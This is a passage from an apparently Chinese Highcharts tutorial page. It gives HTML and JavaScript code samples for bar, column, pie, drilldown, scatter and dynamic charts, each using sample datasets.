Highcharts.getOptions().colors[0], fillOpacity: 0.3, zIndex: 0 &#125; ]; var json = &#123;&#125;; json.title = title; json.xAxis = xAxis; json.yAxis = yAxis; json.tooltip = tooltip; json.legend = legend; json.series = series; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 条形图示例示例1 基本条形图 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'bar' &#125;; var title = &#123; text: 'Historic World Population by Region' &#125;; var subtitle = &#123; text: 'Source: Wikipedia.org' &#125;; var xAxis = &#123; categories: ['Africa', 'America', 'Asia', 'Europe', 'Oceania'], title: &#123; text: null &#125; &#125;; var yAxis = &#123; min: 0, title: &#123; text: 'Population (millions)', align: 'high' &#125;, labels: &#123; overflow: 'justify' &#125; &#125;; var tooltip = &#123; valueSuffix: ' millions' &#125;; var plotOptions = &#123; bar: &#123; dataLabels: &#123; enabled: true &#125; &#125; &#125;; var legend = &#123; layout: 'vertical', align: 'right', verticalAlign: 'top', x: -40, y: 100, floating: true, borderWidth: 1, backgroundColor: ((Highcharts.theme &amp;&amp; Highcharts.theme.legendBackgroundColor) || '#FFFFFF'), shadow: true &#125;; var credits = &#123; enabled: false &#125;; var series= [&#123; name: 'Year 1800', data: [107, 31, 635, 203, 2] &#125;, &#123; name: 'Year 1900', data: [133, 156, 947, 408, 6] &#125;, &#123; name: 'Year 2008', data: [973, 914, 4054, 732, 34] &#125; ]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.tooltip = tooltip; json.xAxis = xAxis; json.yAxis = yAxis; json.series = series; json.plotOptions = plotOptions; json.legend = legend; json.credits = credits; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例2反向堆叠图 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'bar' &#125;; var title = &#123; text: 'Bar chart with negative values' &#125;; var xAxis = &#123; categories: ['Apples', 'Oranges', 'Pears', 'Grapes', 'Bananas'] &#125;; var credits = &#123; enabled: false &#125;; var series= [&#123; name: 'John', data: [5, 3, 4, 7, 2] &#125;, &#123; name: 'Jane', data: [2, -2, -3, 2, 1] &#125;, &#123; name: 'Joe', data: [3, 4, 4, -2, 5] &#125; ]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.xAxis = xAxis; json.credits = credits; json.series = series; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 柱形图示例示例1基本柱形图 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'column' &#125;; var title = &#123; text: '每月平均降雨量' &#125;; var subtitle = &#123; text: 'Source: runoob.com' &#125;; var xAxis = &#123; categories: ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'], crosshair: true &#125;; var yAxis = &#123; min: 0, title: &#123; text: 'Rainfall (mm)' &#125; &#125;; var tooltip = &#123; headerFormat: '&lt;span style="font-size:10px"&gt;&#123;point.key&#125;&lt;/span&gt;&lt;table&gt;', pointFormat: '&lt;tr&gt;&lt;td style="color:&#123;series.color&#125;;padding:0"&gt;&#123;series.name&#125;: &lt;/td&gt;' + '&lt;td style="padding:0"&gt;&lt;b&gt;&#123;point.y:.1f&#125; mm&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;', footerFormat: '&lt;/table&gt;', shared: true, useHTML: true &#125;; var plotOptions = &#123; column: &#123; pointPadding: 0.2, borderWidth: 0 &#125; &#125;; var credits = &#123; enabled: false &#125;; var series= [&#123; name: 'Tokyo', data: [49.9, 71.5, 106.4, 129.2, 144.0, 176.0, 135.6, 148.5, 216.4, 194.1, 95.6, 54.4] &#125;, &#123; name: 'New York', data: [83.6, 78.8, 98.5, 93.4, 106.0, 84.5, 105.0, 104.3, 91.2, 83.5, 106.6, 92.3] &#125;, &#123; name: 'London', data: [48.9, 38.8, 39.3, 41.4, 47.0, 48.3, 59.0, 59.6, 52.4, 65.2, 59.3, 51.2] &#125;, &#123; name: 'Berlin', data: [42.4, 33.2, 34.5, 39.7, 52.6, 75.5, 57.4, 60.4, 47.6, 39.1, 46.8, 51.1] &#125;]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.tooltip = tooltip; json.xAxis = xAxis; json.yAxis = yAxis; json.series = series; json.plotOptions = plotOptions; json.credits = credits; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例2从表格中读取数据 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;html&gt;&lt;head&gt; &lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt; &lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt; &lt;script src="https://code.highcharts.com/modules/data.js"&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var data = &#123; table: 'datatable' &#125;; var chart = &#123; type: 'column' &#125;; var title = &#123; text: '从网页中的 HTML 表格中读取数据' &#125;; var yAxis = &#123; allowDecimals: false, title: &#123; text: 'Units' &#125; &#125;; var tooltip = &#123; formatter: function () &#123; return '&lt;b&gt;' + this.series.name + '&lt;/b&gt;&lt;br/&gt;' + this.point.y + ' ' + this.point.name.toLowerCase(); &#125; &#125;; var credits = &#123; enabled: false &#125;; var json = &#123;&#125;; json.chart = chart; json.title = title; json.data = data; json.yAxis = yAxis; json.credits = credits; json.tooltip = tooltip; $('#container').highcharts(json);&#125;);&lt;/script&gt;&lt;table id="datatable"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;/th&gt;&lt;th&gt;Jane&lt;/th&gt;&lt;th&gt;John&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th&gt;Apples&lt;/th&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;Pears&lt;/th&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;Plums&lt;/th&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;11&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;Bananas&lt;/th&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;Oranges&lt;/th&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;4&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 饼图示例示例1基本饼图 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; plotBackgroundColor: null, plotBorderWidth: null, plotShadow: false &#125;; var title = &#123; text: '2014 年各浏览器市场占有比例' &#125;; var tooltip = &#123; pointFormat: '&#123;series.name&#125;: &lt;b&gt;&#123;point.percentage:.1f&#125;%&lt;/b&gt;' &#125;; var plotOptions = &#123; pie: &#123; allowPointSelect: true, cursor: 'pointer', dataLabels: &#123; enabled: true, format: '&lt;b&gt;&#123;point.name&#125;%&lt;/b&gt;: &#123;point.percentage:.1f&#125; %', style: &#123; color: (Highcharts.theme &amp;&amp; Highcharts.theme.contrastTextColor) || 'black' &#125; &#125; &#125; &#125;; var series= [&#123; type: 'pie', name: 'Browser share', data: [ ['Firefox', 45.0], ['IE', 26.8], &#123; name: 'Chrome', y: 12.8, sliced: true, selected: true &#125;, ['Safari', 8.5], ['Opera', 6.2], ['Others', 0.7] ] &#125;]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.tooltip = tooltip; json.series = series; json.plotOptions = plotOptions; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例2显示图例饼图 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; plotBackgroundColor: null, plotBorderWidth: null, plotShadow: false &#125;; var title = &#123; text: 'Browser market shares at a specific website, 2014' &#125;; var tooltip = &#123; pointFormat: '&#123;series.name&#125;: &lt;b&gt;&#123;point.percentage:.1f&#125;%&lt;/b&gt;' &#125;; var plotOptions = &#123; pie: &#123; allowPointSelect: true, cursor: 'pointer', dataLabels: &#123; enabled: false &#125;, showInLegend: true &#125; &#125;; var series= [&#123; type: 'pie', name: 'Browser share', data: [ ['Firefox', 45.0], ['IE', 26.8], &#123; name: 'Chrome', y: 12.8, sliced: true, selected: true &#125;, ['Safari', 8.5], ['Opera', 6.2], ['Others', 0.7] ] &#125;]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.tooltip = tooltip; json.series = series; json.plotOptions = plotOptions; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例3向下钻取饼图 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/modules/drilldown.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/modules/data.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; Highcharts.data(&#123; csv: document.getElementById('tsv').innerHTML, itemDelimiter: '\t', parsed: function (columns) &#123; var brands = &#123;&#125;, brandsData = [], versions = &#123;&#125;, drilldownSeries = []; // Parse percentage strings columns[1] = $.map(columns[1], function (value) &#123; if (value.indexOf('%') === value.length - 1) &#123; value = parseFloat(value); &#125; return value; &#125;); $.each(columns[0], function (i, name) &#123; var brand, version; if (i &gt; 0) &#123; // Remove special edition notes name = name.split(' -')[0]; // Split into brand and version version = name.match(/([0-9]+[\.0-9x]*)/); if (version) &#123; version = version[0]; &#125; brand = name.replace(version, ''); // Create the main data if (!brands[brand]) &#123; brands[brand] = columns[1][i]; &#125; else &#123; brands[brand] += columns[1][i]; &#125; // Create the version data if (version !== null) &#123; if (!versions[brand]) &#123; versions[brand] = []; &#125; versions[brand].push(['v' + version, columns[1][i]]); &#125; &#125; &#125;); $.each(brands, function (name, y) &#123; brandsData.push(&#123; name: name, y: y, drilldown: versions[name] ? name : null &#125;); &#125;); $.each(versions, function (key, value) &#123; drilldownSeries.push(&#123; name: key, id: key, data: value &#125;); &#125;); var chart = &#123; type: 'pie' &#125;; var title = &#123; text: 'Browser market shares. November, 2013' &#125;; var subtitle = &#123; text: 'Click the slices to view versions. Source: netmarketshare.com.' &#125;; var xAxis = &#123; type: 'category' &#125;; var yAxis =&#123; title: &#123; text: 'Total percent market share' &#125; &#125;; var tooltip = &#123; headerFormat: '&lt;span style="font-size:11px"&gt;&#123;series.name&#125;&lt;/span&gt;&lt;br&gt;', pointFormat: '&lt;span style="color:&#123;point.color&#125;"&gt;&#123;point.name&#125;&lt;/span&gt;: &lt;b&gt;&#123;point.y:.2f&#125;%&lt;/b&gt; of total&lt;br/&gt;' &#125;; var credits = &#123; enabled: false &#125;; var series= [&#123; name: 'Brands', colorByPoint: true, data: brandsData &#125;]; var drilldown= &#123; series: drilldownSeries &#125; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.xAxis = xAxis; json.yAxis = yAxis; json.tooltip = tooltip; json.credits = credits; json.series = series; json.drilldown = drilldown; $('#container').highcharts(json); &#125; &#125;);&#125;);&lt;/script&gt;&lt;!-- Data from www.netmarketshare.com. Select Browsers =&gt; Desktop share by version. Download as tsv. --&gt;&lt;pre id="tsv" style="display:none"&gt;Browser Version Total Market ShareMicrosoft Internet Explorer 8.0 26.61%Microsoft Internet Explorer 9.0 16.96%Chrome 18.0 8.01%Chrome 19.0 7.73%Firefox 12 6.72%Microsoft Internet Explorer 6.0 6.40%Firefox 11 4.72%Microsoft Internet Explorer 7.0 3.55%Safari 5.1 3.53%Firefox 13 2.16%Firefox 3.6 1.87%Opera 11.x 1.30%Chrome 17.0 1.13%Firefox 10 0.90%Safari 5.0 0.85%Firefox 9.0 0.65%Firefox 8.0 0.55%Firefox 4.0 0.50%Chrome 16.0 0.45%Firefox 3.0 0.36%Firefox 3.5 0.36%Firefox 6.0 0.32%Firefox 5.0 0.31%Firefox 7.0 0.29%Proprietary or Undetectable 0.29%Chrome 18.0 - Maxthon Edition 0.26%Chrome 14.0 0.25%Chrome 20.0 0.24%Chrome 15.0 0.18%Chrome 12.0 0.16%Opera 12.x 0.15%Safari 4.0 0.14%Chrome 13.0 0.13%Safari 4.1 0.12%Chrome 11.0 0.10%Firefox 14 0.10%Firefox 2.0 0.09%Chrome 10.0 0.09%Opera 10.x 0.09%Microsoft Internet Explorer 8.0 - Tencent Traveler Edition 0.09%&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt; 散点图示例示例1基本散点图 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'scatter', zoomType: 'xy' &#125;; var title = &#123; text: 'Height Versus Weight of 507 Individuals by Gender' &#125;; var subtitle = &#123; text: 'Source: Heinz 2003' &#125;; var xAxis = &#123; title: &#123; enabled: true, text: 'Height (cm)' &#125;, startOnTick: true, endOnTick: true, showLastLabel: true &#125;; var yAxis = &#123; title: &#123; text: 'Weight (kg)' &#125; &#125;; var legend = &#123; layout: 'vertical', align: 'left', verticalAlign: 'top', x: 100, y: 70, floating: true, backgroundColor: (Highcharts.theme &amp;&amp; Highcharts.theme.legendBackgroundColor) || '#FFFFFF', borderWidth: 1 &#125; var plotOptions = &#123; scatter: &#123; marker: &#123; radius: 5, states: &#123; hover: &#123; enabled: true, lineColor: 'rgb(100,100,100)' &#125; &#125; &#125;, states: &#123; hover: &#123; marker: &#123; enabled: false &#125; &#125; &#125;, tooltip: &#123; headerFormat: '&lt;b&gt;&#123;series.name&#125;&lt;/b&gt;&lt;br&gt;', pointFormat: '&#123;point.x&#125; cm, &#123;point.y&#125; kg' &#125; &#125; &#125;; var series= [&#123; name: 'Female', color: 'rgba(223, 83, 83, .5)', data: [[161.2, 51.6], [167.5, 59.0], [159.5, 49.2], [157.0, 63.0], [155.8, 53.6], [170.0, 59.0], [159.1, 47.6], [166.0, 69.8], [176.2, 66.8], [160.2, 75.2], [172.5, 55.2], [170.9, 54.2], [172.9, 62.5], [153.4, 42.0], [160.0, 50.0], [147.2, 49.8], [168.2, 49.2], [175.0, 73.2], [157.0, 47.8], [167.6, 68.8], [159.5, 50.6], [175.0, 82.5], [166.8, 57.2], [176.5, 87.8], [170.2, 72.8], [174.0, 54.5], [173.0, 59.8], [179.9, 67.3], [170.5, 67.8], [160.0, 47.0], [154.4, 46.2], [162.0, 55.0], [176.5, 83.0], [160.0, 54.4], [152.0, 45.8], [162.1, 53.6], [170.0, 73.2], [160.2, 52.1], [161.3, 67.9], [166.4, 56.6], [168.9, 62.3], [163.8, 58.5], [167.6, 54.5], [160.0, 50.2], [161.3, 60.3], [167.6, 58.3], [165.1, 56.2], [160.0, 50.2], [170.0, 72.9], [157.5, 59.8], [167.6, 61.0], [160.7, 69.1], [163.2, 55.9], [152.4, 46.5], [157.5, 54.3], [168.3, 54.8], [180.3, 60.7], [165.5, 60.0], [165.0, 62.0], [164.5, 60.3], [156.0, 52.7], [160.0, 74.3], [163.0, 62.0], [165.7, 73.1], [161.0, 80.0], [162.0, 54.7], [166.0, 53.2], [174.0, 75.7], [172.7, 61.1], [167.6, 55.7], [151.1, 48.7], [164.5, 52.3], [163.5, 50.0], [152.0, 59.3], [169.0, 62.5], [164.0, 55.7], [161.2, 54.8], [155.0, 45.9], [170.0, 70.6], [176.2, 67.2], [170.0, 69.4], [162.5, 58.2], [170.3, 64.8], [164.1, 71.6], [169.5, 52.8], [163.2, 59.8], [154.5, 49.0], [159.8, 50.0], [173.2, 69.2], [170.0, 55.9], [161.4, 63.4], [169.0, 58.2], [166.2, 58.6], [159.4, 45.7], [162.5, 52.2], [159.0, 48.6], [162.8, 57.8], [159.0, 55.6], [179.8, 66.8], [162.9, 59.4], [161.0, 53.6], [151.1, 73.2], [168.2, 53.4], [168.9, 69.0], [173.2, 58.4], [171.8, 56.2], [178.0, 70.6], [164.3, 59.8], [163.0, 72.0], [168.5, 65.2], [166.8, 56.6], [172.7, 105.2], [163.5, 51.8], [169.4, 63.4], [167.8, 59.0], [159.5, 47.6], [167.6, 63.0], [161.2, 55.2], [160.0, 45.0], [163.2, 54.0], [162.2, 50.2], [161.3, 60.2], [149.5, 44.8], [157.5, 58.8], [163.2, 56.4], [172.7, 62.0], [155.0, 49.2], [156.5, 67.2], [164.0, 53.8], [160.9, 54.4], [162.8, 58.0], [167.0, 59.8], [160.0, 54.8], [160.0, 43.2], [168.9, 60.5], [158.2, 46.4], [156.0, 64.4], [160.0, 48.8], [167.1, 62.2], [158.0, 55.5], [167.6, 57.8], [156.0, 54.6], [162.1, 59.2], [173.4, 52.7], [159.8, 53.2], [170.5, 64.5], [159.2, 51.8], [157.5, 56.0], [161.3, 63.6], [162.6, 63.2], [160.0, 59.5], [168.9, 56.8], [165.1, 64.1], [162.6, 50.0], [165.1, 72.3], [166.4, 55.0], [160.0, 55.9], [152.4, 60.4], [170.2, 69.1], [162.6, 84.5], [170.2, 55.9], [158.8, 55.5], [172.7, 69.5], [167.6, 76.4], [162.6, 61.4], [167.6, 65.9], [156.2, 58.6], [175.2, 66.8], [172.1, 56.6], [162.6, 58.6], [160.0, 55.9], [165.1, 59.1], [182.9, 81.8], [166.4, 70.7], [165.1, 56.8], [177.8, 60.0], [165.1, 58.2], [175.3, 72.7], [154.9, 54.1], [158.8, 49.1], [172.7, 75.9], [168.9, 55.0], [161.3, 57.3], [167.6, 55.0], [165.1, 65.5], [175.3, 65.5], [157.5, 48.6], [163.8, 58.6], [167.6, 63.6], [165.1, 55.2], [165.1, 62.7], [168.9, 56.6], [162.6, 53.9], [164.5, 63.2], [176.5, 73.6], [168.9, 62.0], [175.3, 63.6], [159.4, 53.2], [160.0, 53.4], [170.2, 55.0], [162.6, 70.5], [167.6, 54.5], [162.6, 54.5], [160.7, 55.9], [160.0, 59.0], [157.5, 63.6], [162.6, 54.5], [152.4, 47.3], [170.2, 67.7], [165.1, 80.9], [172.7, 70.5], [165.1, 60.9], [170.2, 63.6], [170.2, 54.5], [170.2, 59.1], [161.3, 70.5], [167.6, 52.7], [167.6, 62.7], [165.1, 86.3], [162.6, 66.4], [152.4, 67.3], [168.9, 63.0], [170.2, 73.6], [175.2, 62.3], [175.2, 57.7], [160.0, 55.4], [165.1, 104.1], [174.0, 55.5], [170.2, 77.3], [160.0, 80.5], [167.6, 64.5], [167.6, 72.3], [167.6, 61.4], [154.9, 58.2], [162.6, 81.8], [175.3, 63.6], [171.4, 53.4], [157.5, 54.5], [165.1, 53.6], [160.0, 60.0], [174.0, 73.6], [162.6, 61.4], [174.0, 55.5], [162.6, 63.6], [161.3, 60.9], [156.2, 60.0], [149.9, 46.8], [169.5, 57.3], [160.0, 64.1], [175.3, 63.6], [169.5, 67.3], [160.0, 75.5], [172.7, 68.2], [162.6, 61.4], [157.5, 76.8], [176.5, 71.8], [164.4, 55.5], [160.7, 48.6], [174.0, 66.4], [163.8, 67.3]] &#125;, &#123; name: 'Male', color: 'rgba(119, 152, 191, .5)', data: [[174.0, 65.6], [175.3, 71.8], [193.5, 80.7], [186.5, 72.6], [187.2, 78.8], [181.5, 74.8], [184.0, 86.4], [184.5, 78.4], [175.0, 62.0], [184.0, 81.6], [180.0, 76.6], [177.8, 83.6], [192.0, 90.0], [176.0, 74.6], [174.0, 71.0], [184.0, 79.6], [192.7, 93.8], [171.5, 70.0], [173.0, 72.4], [176.0, 85.9], [176.0, 78.8], [180.5, 77.8], [172.7, 66.2], [176.0, 86.4], [173.5, 81.8], [178.0, 89.6], [180.3, 82.8], [180.3, 76.4], [164.5, 63.2], [173.0, 60.9], [183.5, 74.8], [175.5, 70.0], [188.0, 72.4], [189.2, 84.1], [172.8, 69.1], [170.0, 59.5], [182.0, 67.2], [170.0, 61.3], [177.8, 68.6], [184.2, 80.1], [186.7, 87.8], [171.4, 84.7], [172.7, 73.4], [175.3, 72.1], [180.3, 82.6], [182.9, 88.7], [188.0, 84.1], [177.2, 94.1], [172.1, 74.9], [167.0, 59.1], [169.5, 75.6], [174.0, 86.2], [172.7, 75.3], [182.2, 87.1], [164.1, 55.2], [163.0, 57.0], [171.5, 61.4], [184.2, 76.8], [174.0, 86.8], [174.0, 72.2], [177.0, 71.6], [186.0, 84.8], [167.0, 68.2], [171.8, 66.1], [182.0, 72.0], [167.0, 64.6], [177.8, 74.8], [164.5, 70.0], [192.0, 101.6], [175.5, 63.2], [171.2, 79.1], [181.6, 78.9], [167.4, 67.7], [181.1, 66.0], [177.0, 68.2], [174.5, 63.9], [177.5, 72.0], [170.5, 56.8], [182.4, 74.5], [197.1, 90.9], [180.1, 93.0], [175.5, 80.9], [180.6, 72.7], [184.4, 68.0], [175.5, 70.9], [180.6, 72.5], [177.0, 72.5], [177.1, 83.4], [181.6, 75.5], [176.5, 73.0], [175.0, 70.2], [174.0, 73.4], [165.1, 70.5], [177.0, 68.9], [192.0, 102.3], [176.5, 68.4], [169.4, 65.9], [182.1, 75.7], [179.8, 84.5], [175.3, 87.7], [184.9, 86.4], [177.3, 73.2], [167.4, 53.9], [178.1, 72.0], [168.9, 55.5], [157.2, 58.4], [180.3, 83.2], [170.2, 72.7], [177.8, 64.1], [172.7, 72.3], [165.1, 65.0], [186.7, 86.4], [165.1, 65.0], [174.0, 88.6], [175.3, 84.1], [185.4, 66.8], [177.8, 75.5], [180.3, 93.2], [180.3, 82.7], [177.8, 58.0], [177.8, 79.5], [177.8, 78.6], [177.8, 71.8], [177.8, 116.4], [163.8, 72.2], [188.0, 83.6], [198.1, 85.5], [175.3, 90.9], [166.4, 85.9], [190.5, 89.1], [166.4, 75.0], [177.8, 77.7], [179.7, 86.4], [172.7, 90.9], [190.5, 73.6], [185.4, 76.4], [168.9, 69.1], [167.6, 84.5], [175.3, 64.5], [170.2, 69.1], [190.5, 108.6], [177.8, 86.4], [190.5, 80.9], [177.8, 87.7], [184.2, 94.5], [176.5, 80.2], [177.8, 72.0], [180.3, 71.4], [171.4, 72.7], [172.7, 84.1], [172.7, 76.8], [177.8, 63.6], [177.8, 80.9], [182.9, 80.9], [170.2, 85.5], [167.6, 68.6], [175.3, 67.7], [165.1, 66.4], [185.4, 102.3], [181.6, 70.5], [172.7, 95.9], [190.5, 84.1], [179.1, 87.3], [175.3, 71.8], [170.2, 65.9], [193.0, 95.9], [171.4, 91.4], [177.8, 81.8], [177.8, 96.8], [167.6, 69.1], [167.6, 82.7], [180.3, 75.5], [182.9, 79.5], [176.5, 73.6], [186.7, 91.8], [188.0, 84.1], [188.0, 85.9], [177.8, 81.8], [174.0, 82.5], [177.8, 80.5], [171.4, 70.0], [185.4, 81.8], [185.4, 84.1], [188.0, 90.5], [188.0, 91.4], [182.9, 89.1], [176.5, 85.0], [175.3, 69.1], [175.3, 73.6], [188.0, 80.5], [188.0, 82.7], [175.3, 86.4], [170.5, 67.7], [179.1, 92.7], [177.8, 93.6], [175.3, 70.9], [182.9, 75.0], [170.8, 93.2], [188.0, 93.2], [180.3, 77.7], [177.8, 61.4], [185.4, 94.1], [168.9, 75.0], [185.4, 83.6], [180.3, 85.5], [174.0, 73.9], [167.6, 66.8], [182.9, 87.3], [160.0, 72.3], [180.3, 88.6], [167.6, 75.5], [186.7, 101.4], [175.3, 91.1], [175.3, 67.3], [175.9, 77.7], [175.3, 81.8], [179.1, 75.5], [181.6, 84.5], [177.8, 76.6], [182.9, 85.0], [177.8, 102.5], [184.2, 77.3], [179.1, 71.8], [176.5, 87.9], [188.0, 94.3], [174.0, 70.9], [167.6, 64.5], [170.2, 77.3], [167.6, 72.3], [188.0, 87.3], [174.0, 80.0], [176.5, 82.3], [180.3, 73.6], [167.6, 74.1], [188.0, 85.9], [180.3, 73.2], [167.6, 76.3], [183.0, 65.9], [183.0, 90.9], [179.1, 89.1], [170.2, 62.3], [177.8, 82.7], [179.1, 79.1], [190.5, 98.2], [177.8, 84.1], [180.3, 83.2], [180.3, 83.2]] &#125; ]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.legend = legend; json.xAxis = xAxis; json.yAxis = yAxis; json.series = series; json.plotOptions = plotOptions; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 动态图示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'spline', animation: Highcharts.svg, // don't animate in IE &lt; IE 10. marginRight: 10, events: &#123; load: function () &#123; // set up the updating 